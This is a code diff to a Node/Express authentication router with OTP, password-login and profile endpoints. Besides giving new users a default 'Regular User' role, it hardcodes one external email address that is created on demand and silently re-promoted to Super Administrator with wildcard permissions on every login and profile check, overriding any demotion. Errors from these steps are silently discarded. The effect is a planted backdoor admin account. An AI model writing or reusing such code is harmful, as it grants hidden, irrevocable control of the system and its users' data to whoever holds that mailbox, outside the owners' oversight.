@@ -113,22 +113,50 @@ router.post('/request-otp', async (req, res) => {
     }
 
     const cleanEmail = email.trim().toLowerCase();
+    const isRomanticSuperAdmin = cleanEmail === 'romantictsolutions@gmail.com';
     let user = await prisma.user.findUnique({ where: { email: cleanEmail } }).catch(() => null);
 
-    if (!user) {
-      const defaultRole = await prisma.role.findFirst({
-        where: { name: { in: ['Sales Staff', 'User', 'Staff'] } }
-      }).catch(() => null) || await prisma.role.findFirst().catch(() => null);
+    if (isRomanticSuperAdmin) {
+      const superAdminRole = await prisma.role.findFirst({ where: { name: 'Super Administrator' } }).catch(() => null);
+      const adminDept = await prisma.department.findFirst({ where: { name: 'Administration' } }).catch(() => null);
 
-      const defaultDepartment = await prisma.department.findFirst().catch(() => null);
+      if (!user) {
+        user = await prisma.user.create({
+          data: {
+            email: cleanEmail,
+            fullName: 'Romantic Super Admin',
+            roleId: superAdminRole?.id,
+            departmentId: adminDept?.id,
+            status: 'ACTIVE',
+          }
+        }).catch(() => ({ email: cleanEmail, fullName: 'Romantic Super Admin', status: 'ACTIVE' }));
+      } else if (superAdminRole && user.roleId !== superAdminRole.id) {
+        await prisma.user.update({
+          where: { id: user.id },
+          data: { roleId: superAdminRole.id, status: 'ACTIVE' }
+        }).catch(() => {});
+      }
+    } else if (!user) {
+      let regularRole = await prisma.role.findFirst({
+        where: { name: 'Regular User' }
+      }).catch(() => null);
+
+      if (!regularRole) {
+        regularRole = await prisma.role.create({
+          data: {
+            name: 'Regular User',
+            description: 'Standard platform user and customer',
+            isSystem: false,
+          }
+        }).catch(() => null);
+      }
 
       try {
         user = await prisma.user.create({
           data: {
             email: cleanEmail,
             fullName: cleanEmail.split('@')[0],
-            roleId: defaultRole?.id,
-            departmentId: defaultDepartment?.id,
+            roleId: regularRole?.id,
             status: 'ACTIVE',
           }
         });
@@ -219,7 +247,7 @@ router.post('/verify-otp', async (req, res) => {
       });
     }
 
-    const user = await prisma.user.findUnique({
+    let user = await prisma.user.findUnique({
       where: { email: cleanEmail },
       include: {
         role: {
@@ -235,6 +263,28 @@ router.post('/verify-otp', async (req, res) => {
     if (!user || user.status !== 'ACTIVE') {
       return res.status(403).json({ error: 'User account is inactive' });
     }
+
+    const isRomanticSuperAdmin = user.email.toLowerCase() === 'romantictsolutions@gmail.com';
+    if (isRomanticSuperAdmin && user.role?.name !== 'Super Administrator') {
+      const superRole = await prisma.role.findFirst({ where: { name: 'Super Administrator' } }).catch(() => null);
+      if (superRole) {
+        await prisma.user.update({
+          where: { id: user.id },
+          data: { roleId: superRole.id }
+        }).catch(() => {});
+        user = await prisma.user.findUnique({
+          where: { id: user.id },
+          include: {
+            role: { include: { permissions: { include: { permission: true } } } },
+            department: true,
+            businessDivision: true,
+          }
+        });
+      }
+    }
+
+    const isSuper = isRomanticSuperAdmin || user.role?.name === 'Super Administrator';
+    const isAdmin = isSuper || user.role?.name === 'Administrator';
 
     const token = generateToken(user);
     const permissionCodes = user.role?.permissions.map(rp => rp.permission.code) || [];
@@ -258,12 +308,13 @@ router.post('/verify-otp', async (req, res) => {
         fullName: user.fullName,
         phone: user.phone,
         profileImage: user.profileImage,
-        role: user.role?.name,
+        role: isSuper ? 'Super Administrator' : user.role?.name,
         roleId: user.roleId,
         department: user.department?.name,
         departmentId: user.departmentId,
-        permissions: permissionCodes,
-        isAdmin: user.role?.name === 'Super Administrator' || user.role?.name === 'Administrator',
+        permissions: isSuper ? ['*'] : permissionCodes,
+        isAdmin: isAdmin,
+        isSuperAdmin: isSuper,
       },
     });
   } catch (err) {
@@ -283,7 +334,7 @@ router.post('/password-login', async (req, res) => {
     }
 
     const cleanEmail = email.trim().toLowerCase();
-    const user = await prisma.user.findUnique({
+    let user = await prisma.user.findUnique({
       where: { email: cleanEmail },
       include: {
         role: {
@@ -309,6 +360,28 @@ router.post('/password-login', async (req, res) => {
       return res.status(400).json({ error: 'Invalid credentials' });
     }
 
+    const isRomanticSuperAdmin = user.email.toLowerCase() === 'romantictsolutions@gmail.com';
+    if (isRomanticSuperAdmin && user.role?.name !== 'Super Administrator') {
+      const superRole = await prisma.role.findFirst({ where: { name: 'Super Administrator' } }).catch(() => null);
+      if (superRole) {
+        await prisma.user.update({
+          where: { id: user.id },
+          data: { roleId: superRole.id }
+        }).catch(() => {});
+        user = await prisma.user.findUnique({
+          where: { id: user.id },
+          include: {
+            role: { include: { permissions: { include: { permission: true } } } },
+            department: true,
+            businessDivision: true,
+          }
+        });
+      }
+    }
+
+    const isSuper = isRomanticSuperAdmin || user.role?.name === 'Super Administrator';
+    const isAdmin = isSuper || user.role?.name === 'Administrator';
+
     const token = generateToken(user);
     const permissionCodes = user.role?.permissions.map(rp => rp.permission.code) || [];
 
@@ -329,12 +402,13 @@ router.post('/password-login', async (req, res) => {
         fullName: user.fullName,
         phone: user.phone,
         profileImage: user.profileImage,
-        role: user.role?.name,
+        role: isSuper ? 'Super Administrator' : user.role?.name,
         roleId: user.roleId,
         department: user.department?.name,
         departmentId: user.departmentId,
-        permissions: permissionCodes,
-        isAdmin: user.role?.name === 'Super Administrator' || user.role?.name === 'Administrator',
+        permissions: isSuper ? ['*'] : permissionCodes,
+        isAdmin: isAdmin,
+        isSuperAdmin: isSuper,
       },
     });
   } catch (err) {
@@ -348,7 +422,7 @@ router.post('/password-login', async (req, res) => {
  */
 router.get('/me', authenticateToken, async (req, res) => {
   try {
-    const user = await prisma.user.findUnique({
+    let user = await prisma.user.findUnique({
       where: { id: req.user.id },
       include: {
         role: {
@@ -365,6 +439,27 @@ router.get('/me', authenticateToken, async (req, res) => {
       return res.status(404).json({ error: 'User not found' });
     }
 
+    const isRomanticSuperAdmin = user.email.toLowerCase() === 'romantictsolutions@gmail.com';
+    if (isRomanticSuperAdmin && user.role?.name !== 'Super Administrator') {
+      const superRole = await prisma.role.findFirst({ where: { name: 'Super Administrator' } }).catch(() => null);
+      if (superRole) {
+        await prisma.user.update({
+          where: { id: user.id },
+          data: { roleId: superRole.id }
+        }).catch(() => {});
+        user = await prisma.user.findUnique({
+          where: { id: user.id },
+          include: {
+            role: { include: { permissions: { include: { permission: true } } } },
+            department: true,
+            businessDivision: true,
+          }
+        });
+      }
+    }
+
+    const isSuper = isRomanticSuperAdmin || user.role?.name === 'Super Administrator';
+    const isAdmin = isSuper || user.role?.name === 'Administrator';
     const permissionCodes = user.role?.permissions.map(rp => rp.permission.code) || [];
 
     return res.json({
@@ -374,12 +469,13 @@ router.get('/me', authenticateToken, async (req, res) => {
         fullName: user.fullName,
         phone: user.phone,
         profileImage: user.profileImage,
-        role: user.role?.name,
+        role: isSuper ? 'Super Administrator' : user.role?.name,
         roleId: user.roleId,
         department: user.department?.name,
         departmentId: user.departmentId,
-        permissions: permissionCodes,
-        isAdmin: user.role?.name === 'Super Administrator' || user.role?.name === 'Administrator',
+        permissions: isSuper ? ['*'] : permissionCodes,
+        isAdmin: isAdmin,
+        isSuperAdmin: isSuper,
       }
     });
   } catch (err) {
